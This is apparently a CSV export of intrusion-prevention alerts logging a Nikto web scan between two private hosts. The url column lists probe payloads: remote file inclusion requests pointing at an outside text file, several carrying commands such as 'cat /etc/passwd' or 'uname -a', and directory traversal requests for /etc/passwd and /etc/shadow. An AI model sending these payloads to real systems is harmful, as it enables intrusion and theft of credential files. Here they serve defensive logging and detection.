attackid,sessionid,repeated,severity,attack,service,srcip,dstip,srcport,dstport,subtype,eventtype,url
44780,7299,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51112,80,ips,signature,
44780,7300,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51114,80,ips,signature,/config.php?xcart_dir=http://cirt.net/rfiinc.txt?
44780,7300,64,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51114,80,ips,signature,
44780,7302,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51116,80,ips,signature,/custom_vars.php?sys[path_addon]=http://cirt.net/rfiinc.txt?
15115,7302,1,medium,DFD.Cart.Set.Depth.Parameter.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51116,80,ips,signature,/dfd_cart/app.lib/product.control/core.php/customer.area/customer.browse.list.php?set_depth=http://cirt.net/rfiinc.txt??
29615,7302,1,medium,Vmist.Downstat.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51116,80,ips,signature,/downstat1.8/chart.php?art=http://cirt.net/rfiinc.txt??
15100,7302,1,medium,AnyInventory.Environment.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51116,80,ips,signature,/environment.php?DIR_PREFIX=http://cirt.net/rfiinc.txt?
44780,7302,94,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51116,80,ips,signature,
15115,7302,3,medium,DFD.Cart.Set.Depth.Parameter.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51116,80,ips,signature,
44780,7303,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51118,80,ips,signature,/event_cal/module/embed/day.php?path=http://cirt.net/rfiinc.txt?
44780,7303,100,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51118,80,ips,signature,
44780,7304,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51120,80,ips,signature,/getpage.php?page=online&doc_path=http://cirt.net/rfiinc.txt?
44780,7304,94,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51120,80,ips,signature,
44780,7305,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51122,80,ips,signature,/include/cls_headline_prod.php?INCLUDE_PATH=http://cirt.net/rfiinc.txt?
44780,7305,8,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51122,80,ips,signature,
44780,7306,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51124,80,ips,signature,/include/default_header.php?script_path=http://cirt.net/rfiinc.txt?
14740,7306,1,high,Mazen.PHP.Chat.Multiple.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51124,80,ips,signature,/include/pear/IT.php?basepath=http://cirt.net/rfiinc.txt?
30542,7306,1,high,Quezza.Class_template.php.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51124,80,ips,signature,/includes/class_template.php?quezza_root_path=http://cirt.net/rfiinc.txt?
44780,7306,93,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51124,80,ips,signature,
14740,7306,5,high,Mazen.PHP.Chat.Multiple.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51124,80,ips,signature,
44780,7307,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51126,80,ips,signature,/includes/iplogger.php?phpbb_root_path=http://cirt.net/rfiinc.txt??ls
48010,7307,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51126,80,ips,signature,/index.php?_REQUEST=&_REQUEST[option]=com_content&_REQUEST[Itemid=1&GLOBALS=&mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
14157,7307,1,medium,TotalCalendar.Multiple.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51126,80,ips,signature,/index.php?inc_dir=http://cirt.net/rfiinc.txt?
44780,7307,96,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51126,80,ips,signature,
48010,7307,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51126,80,ips,signature,
14157,7307,1,medium,TotalCalendar.Multiple.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51126,80,ips,signature,
44780,7308,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51128,80,ips,signature,/index.php?may=http://cirt.net/rfiinc.txt?
48010,7308,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51128,80,ips,signature,/index.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
44780,7308,91,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51128,80,ips,signature,
44780,7309,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51130,80,ips,signature,/ktmlpro/includes/ktedit/toolbar.php?dirDepth=http://cirt.net/rfiinc.txt?
44780,7310,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51132,80,ips,signature,/lang/leslangues.php?fichier=http://cirt.net/rfiinc.txt?
15092,7310,1,high,OFFL.DOC.ROOT.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51132,80,ips,signature,/lib/functions.php?DOC_ROOT=http://cirt.net/rfiinc.txt?
14949,7310,1,high,Linksnet.Newsfeed.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51132,80,ips,signature,/linksnet_newsfeed/linksnet_linkslog_rss.php?dirpath_linksnet_newsfeed=http://cirt.net/rfiinc.txt?
48010,7310,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51132,80,ips,signature,/mamboleto.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
44780,7310,94,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51132,80,ips,signature,
15092,7310,1,high,OFFL.DOC.ROOT.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51132,80,ips,signature,
14949,7310,1,high,Linksnet.Newsfeed.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51132,80,ips,signature,
48010,7310,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51132,80,ips,signature,
44780,7311,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51134,80,ips,signature,/manage_songs.php?foing_root_path=http://cirt.net/rfiinc.txt?
15118,7311,1,medium,PhpRealty.MGR.Parameter.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51134,80,ips,signature,/manager/admin/index.php?MGR=http://cirt.net/rfiinc.txt?
29564,7311,1,medium,PHP.Remote.Arbitrary.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51134,80,ips,signature,/membres/membreManager.php?include_path=http://cirt.net/rfiinc.txt??
44780,7311,96,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51134,80,ips,signature,
15118,7311,2,medium,PhpRealty.MGR.Parameter.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51134,80,ips,signature,
44780,7312,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51136,80,ips,signature,/modules/forums/blocks/latest_posts.php?system[path]=http://cirt.net/rfiinc.txt?
14742,7312,1,low,Xoops.Horoscope.Module.Footer.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51136,80,ips,signature,/modules/horoscope/footer.php?xoopsConfig[root_path]=http://cirt.net/rfiinc.txt?
48010,7312,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51136,80,ips,signature,/modules/mod_as_category.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
15110,7312,1,medium,iziContents.gsLanguage.Parameter.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51136,80,ips,signature,/modules/search/search.php?language_home=&rootdp=zZz&gsLanguage=http://cirt.net/rfiinc.txt?
14950,7312,1,low,NcasterCMS.Archive.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51136,80,ips,signature,/ncaster/admin/addons/archive/archive.php?adminfolder=http://cirt.net/rfiinc.txt?
14230,7312,1,medium,ZebraFeeds.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51136,80,ips,signature,/newsfeeds/includes/aggregator.php?zf_path=http://cirt.net/rfiinc.txt?
44780,7312,89,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51136,80,ips,signature,
48010,7312,4,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51136,80,ips,signature,
15110,7312,1,medium,iziContents.gsLanguage.Parameter.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51136,80,ips,signature,
14230,7312,1,medium,ZebraFeeds.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51136,80,ips,signature,
44780,7313,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51138,80,ips,signature,/noticias.php?inc=http://cirt.net/rfiinc.txt??
29564,7313,1,medium,PHP.Remote.Arbitrary.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51138,80,ips,signature,/open-admin/plugins/site_protection/index.php?config%5boi_dir%5d=http://cirt.net/rfiinc.txt??
10819,7313,1,high,PHP.Phorum.Arbitrary.Code.Execution,HTTP,172.16.1.2,172.16.2.2,51138,80,ips,signature,/phorum/plugin/replace/plugin.php?PHORUM[settings_dir]=http://cirt.net/rfiinc.txt?
14737,7313,1,low,phphtml.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51138,80,ips,signature,/phphtml.php?htmlclass_path=http://cirt.net/rfiinc.txt?
44780,7313,97,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51138,80,ips,signature,
44780,7314,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51140,80,ips,signature,/phpreactor/inc/view.inc.php?pathtohomedir=http://cirt.net/rfiinc.txt??
14953,7314,1,low,Php.Blue.Dragon.Activecontent.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51140,80,ips,signature,/public_includes/pub_blocks/activecontent.php?vsDragonRootPath=http://cirt.net/rfiinc.txt?
44780,7314,97,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51140,80,ips,signature,
44780,7315,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51142,80,ips,signature,/readmore.php?config[\\\
48010,7315,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51142,80,ips,signature,/releasenote.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
44780,7315,7,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51142,80,ips,signature,
44780,7316,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51144,80,ips,signature,/rempass.php?lang=http://cirt.net/rfiinc.txt?
48010,7316,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51144,80,ips,signature,/script_path/administrator/components/com_admin/admin.admin.html.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt??
15114,7316,1,medium,Helplink.Show.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51144,80,ips,signature,/show.php?file=http://cirt.net/rfiinc.txt?
44780,7316,97,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51144,80,ips,signature,
48010,7316,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51144,80,ips,signature,
44780,7317,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51146,80,ips,signature,/skin/dark/template.php?path=http://cirt.net/rfiinc.txt?
14341,7317,1,high,Aardvark.Topsites.PHP.Remote.Command.Execution,HTTP,172.16.1.2,172.16.2.2,51146,80,ips,signature,/sources/join.php?FORM[url]=owned&CONFIG[captcha]=1&CONFIG[path]=http://cirt.net/rfiinc.txt??cmd=ls
44780,7317,72,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51146,80,ips,signature,
44780,7318,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51148,80,ips,signature,/studip-1.3.0-2/studip-phplib/oohforms.inc?cmd=ls -al&_PHPLIB[libdir]=http://cirt.net/rfiinc.txt??
44780,7319,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51150,80,ips,signature,/styles.php?toroot=http://cirt.net/rfiinc.txt?
48010,7319,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51150,80,ips,signature,/templates/be2004-2/index.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
44780,7319,99,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51150,80,ips,signature,
44780,7320,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51152,80,ips,signature,/themes/header.php?theme_directory=http://cirt.net/rfiinc.txt?%00
44780,7320,10,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51152,80,ips,signature,
44780,7321,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51154,80,ips,signature,/topsites/index.php?page=http://cirt.net/rfiinc.txt??&cmd=uname -a
44780,7322,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51156,80,ips,signature,/towels-0.1/src/scripture.php?pageHeaderFile=http://cirt.net/rfiinc.txt?
29614,7322,1,high,TSEP.Colorswitch.PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51156,80,ips,signature,/tsep/include/colorswitch.php?tsep_config[absPath]=http://cirt.net/rfiinc.txt?
43336,7322,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51156,80,ips,signature,/user.php?caselist[bad_file.txt][path]=http://cirt.net/rfiinc.txt?&command=cat%20/etc/passwd
14948,7322,1,high,LaVague.PrintBar.PHP.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51156,80,ips,signature,/views/print/printbar.php?views_path=http://cirt.net/rfiinc.txt?
44780,7322,96,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51156,80,ips,signature,
29614,7322,1,high,TSEP.Colorswitch.PHP.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51156,80,ips,signature,
44780,7323,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51158,80,ips,signature,/web/BetaBlockModules/ImagesModule/ImagesModule.php?path_prefix=http://cirt.net/rfiinc.txt?
48010,7323,1,medium,PHP.mosConfig_absolute_path.Remote.File.Inclusion,HTTP,172.16.1.2,172.16.2.2,51158,80,ips,signature,/worldpay_notify.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?
44780,7323,99,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51158,80,ips,signature,
44780,7324,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51160,80,ips,signature,/config/config.txt
44780,7324,100,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51160,80,ips,signature,
44780,7325,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51162,80,ips,signature,/ccp14admin/
44780,7325,100,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51162,80,ips,signature,
44780,7326,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51164,80,ips,signature,/UserLogin/
32033,7326,1,medium,VMware.Server.Directory.Traversal,HTTP,172.16.1.2,172.16.2.2,51164,80,ips,signature,/sdk/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/etc/vmware/hostd/vmInventory.xml
44780,7326,27,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51164,80,ips,signature,
44780,7327,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51166,80,ips,signature,/
44780,7328,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51168,80,ips,signature,/jk-status
29965,7328,1,medium,Splunk.Web.Component.Parameter.Injection,HTTP,172.16.1.2,172.16.2.2,51168,80,ips,signature,/en-GB/debug/sso
43336,7328,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51168,80,ips,signature,/axis2/services/Version?xsd=../../../../../../../../../../../etc/passwd
44780,7328,97,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51168,80,ips,signature,
29965,7328,1,medium,Splunk.Web.Component.Parameter.Injection,HTTP,172.16.1.2,172.16.2.2,51168,80,ips,signature,
44780,7329,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51170,80,ips,signature,/servlet/hitcount
44780,7329,19,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51170,80,ips,signature,
43336,7330,1,high,Web.Server.Password.File.Access,HTTP,172.16.1.2,172.16.2.2,51172,80,ips,signature,/htdocs/../../../../../../../../../../../etc/passwd
44780,7331,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51174,80,ips,signature,/?-s
31752,7331,1,high,PHP.CGI.Argument.Injection,HTTP,172.16.1.2,172.16.2.2,51174,80,ips,signature,/login.php?-s
47202,7331,1,high,TP-Link.TL-R600VPN.HTTP.Server.help.Information.Disclosure,HTTP,172.16.1.2,172.16.2.2,51174,80,ips,signature,/help/../../../../../../../../../../../../../../../../etc/shadow
44780,7331,10,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51174,80,ips,signature,
44780,7332,1,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51176,80,ips,signature,/snoop/
44780,7332,50,low,Nikto.Web.Scanner,HTTP,172.16.1.2,172.16.2.2,51176,80,ips,signature,
